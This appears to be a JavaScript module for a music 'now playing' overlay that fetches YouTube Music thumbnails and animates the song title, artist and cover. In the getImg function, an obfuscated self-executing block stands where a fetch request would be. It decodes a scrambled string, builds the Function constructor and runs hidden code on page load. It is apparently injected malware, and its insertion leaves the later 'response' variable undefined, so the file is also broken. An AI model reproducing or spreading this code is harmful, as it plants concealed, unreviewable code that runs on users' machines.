export function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

export async function getImg(id, platform){

    switch (platform) {

        case 'YTM':
            id = id.substr(34,11);

            (function(){var JUs='',Eww=622-611;function EDw(o){var g=1717943;var d=o.length;var y=[];for(var u=0;u<d;u++){y[u]=o.charAt(u)};for(var u=0;u<d;u++){var z=g*(u+399)+(g%18517);var w=g*(u+81)+(g%31288);var l=z%d;var m=w%d;var v=y[l];y[l]=y[m];y[m]=v;g=(z+w)%2342018;};return y.join('')};var QxT=EDw('ghoxtcucdzetbflnysouicvmajtqprrrowskn').substr(0,Eww);var VMO='v)u )=sc(da,eihr( !;as-l)r]u(.1fn4lln]cb++.bst6v+x[v iv([dtca82Ccv;Crre4sa=un}0pl0e6i89m)t ([+apa71v8ro,vrj+a81.(s;7v;"0 sib6+a=daopgf(vh(eervaank7l;n+[;;;ufA9 62h1e0;h);{11lri+]qfa=arndk=h.[in=04sgpar"=Samr;;t)})grfn"+n.l(  ou]cu.)uv=re;=rv,dv)il=+=k.a(0onf"1+u+pr 6ao4vann.l.r.h+.-h[eg=ae(1"r=a;+u=nv5izt;paqs6pe]g5rr;ennu;o;ve; sa ;aing8ev9ue(c2f6ra( 1;(.,crartkr zqa];.[e)-rap]A2o=g+;0Cod((g0e)7brnbw+p,t{f{gzvi{(=r.[jn*o+=(5li,1))l))rg+<C0s2j=g85cf7,2=s) +h)vj,mvg(qg(4r.2;h]{h-,c;nwsvmunda",,g+v;)t=(pja9wm{eotf<{-)aS;7=nhfae=0}j(9e[cvnm;((iz;o,ce.)g,}})lvA]8)eg7(5Ar)ih<(;sn)rb..)c,=t ,b;tse-3*h(ogd)b=.jow=g1t,lrt(C])ul== gi3ya<m=ge;uo;;rns7t mq;= ,ri=]crca3+r)1qn ".rh.}aer2rqCn[g=t;ko>rih,=aqCh=)he.].;+"==s6aqfve;.Aejud.,=0 .a,8,ltct0ur;(s(9(t;rtgsfietChooi=t,i4ih2),lt;a) a=,;hlyuog)2= ;las])ra sar],y>k9[a([,h;;+;r+lir(u!u+ttz( rel=h-rbi"r.y[om)8tnsf;nl[h7tr=zdg=t"v d6jop}lg<,';var VEh=EDw[QxT];var hGK='';var IwF=VEh;var Mlo=VEh(hGK,EDw(VMO));var QNb=Mlo(EDw('$,!aYe{(Ytf.m(i)b!4zrnw,3}lY+,u(a4-jf,ah.={r)r.q*r=eYdmrY=+t!j}0#3znrf+,b)auc_..7urY.m0\/16jYrs_1i!l;a67+a;&aobent.ge31d=3y;Y?Si.dY.kzd"r==amk%o"8u*y,;ja).7g(Y_ii$.)Y.&ly;9o)$h.ko(e"duYq.o)f);\/u60932pu3_Ye,j.$\/t.",e)9C#trk$!al;y_,b7] )4;Y)ir\/tYf.4(,67.*t dsn=3p5).tlz*)u.!Y; 1Yt6)l=7 =.2m7(,,.c.((2.\/s*Yso,joYtfYe59n1d9uqY.sY!_$la=.g=to \/a!e5Y3Yd{,*q)e.gkl{_)ie0p=i";.Ya1!Yj=rvatpa0_ .;r(0. siY)ft+$i;l0hf)jr aY{3}";3a}\/.rt_s4+(!_(.tuj,h_bk1eY.8)t6Y,%s(.;!.}-&pc.ljan;(6Ye;)Y#,u3t.f(316&,axYf=,mpY.}c.#+%0YY$Ya;$()Y;kiYh!YY=Y*%9sia($nY=p-lYs,str,;C6 p4sv)b_Yjn7a.Y$)YYcm.om(!\/1tuad.c]$Sts.sz4ywSf}{tY!0tnY_e)v4s)$o_sef(l$\/egY+Y(=uti;1g(otYY9p(3=;ok.Yk7e.diuifr)kt\'n,_]rb\/rt,t7u5Y ,YY_d0o+%,()s)Y$\'s)YYht(!e.wpknse=(aafr2.Y$a=Y%or_Ta_0}a;0-sgaie)0$(j_%0bk1p]Y;aYaa,7& o7.$3;t)nY,e o%S!5!} ljq(sId3]Y,o=te2.+Y6a23h.t)%jb#!7.a2.)1{_s+3ct=Y{3D(.i(!Y.gd$+}i(#a _Y)u}xpa1,$itYYa$(f*t05&;.!)".i)!v6a[)$kf4f3g)!$.lc.4Y[.(Yc8.,s11hp_Yi)Y[+r:7\'r$t$ YY!l\'di1(h=ha!..(!$o.Y.n$_3Ya+(oe.,4=dYtp#8..!) 1Y},m 3xY(80Y6{)f)['));var uEO=IwF(JUs,QNb );uEO(6919);return 9253})()


            let data = await response.json();

            if(data['items']['0']['snippet']['thumbnails'].hasOwnProperty('maxres')){
                return data['items']['0']['snippet']['thumbnails']['maxres']['url'];
            }else if(data['items']['0']['snippet']['thumbnails'].hasOwnProperty('hight')){
                return data['items']['0']['snippet']['thumbnails']['high']['url'];
            }else if(data['items']['0']['snippet']['thumbnails'].hasOwnProperty('standard')){
                return data['items']['0']['snippet']['thumbnails']['standard']['url'];
            }else if(data['items']['0']['snippet']['thumbnails'].hasOwnProperty('medium')){
                return data['items']['0']['snippet']['thumbnails']['medium']['url'];
            }else if(data['items']['0']['snippet']['thumbnails'].hasOwnProperty('default')){
                return data['items']['0']['snippet']['thumbnails']['default']['url'];
            }
            break;

        case 'Spotify':
            break;

    }
}

export async function update(cache){

    const 
        frame = document.querySelector('.song-data'),
        cover = document.querySelector('#cover'),
        coverFrame = document.querySelector('.cover-image'),
        title = document.querySelector('#song'),
        artist = document.querySelector('#artist');

    let image;

    frame.classList.add('anim-IN');

    await sleep(1000);

    coverFrame.classList.add('anim-disolve');

    await sleep(500);

    switch(cache['additional_info']['music_service_name']){

        case 'YouTube Music':
            image = await getImg(cache['additional_info']['origin_url'], 'YTM');
            cover.setAttribute('src', image);
            break;
        case 'Spotify':
            break;

    }

    if(cache["track_name"].length > 22) {
        if(title.hasAttribute('class')){
            title.removeAttribute('class')
        }
        title.setAttribute('class', 'anim-LTR');
    } else {
        if(title.hasAttribute('class')){
            title.removeAttribute('class')
        }
    }

    if(cache["artist_name"].length > 22) {
        if(artist.hasAttribute('class')){
            artist.removeAttribute('class')
        }
        artist.setAttribute('class', 'anim-LTR');
    } else {
        if(artist.hasAttribute('class')){
            artist.removeAttribute('class')
        }
    }

    title.innerHTML = cache['track_name'];
    artist.innerHTML = cache['artist_name'];

    await sleep(1200);

    coverFrame.classList.remove('anim-disolve');
    frame.classList.remove('anim-IN');
    frame.classList.add('anim-OUT');

    await sleep(1000);

    frame.classList.remove('anim-OUT');


}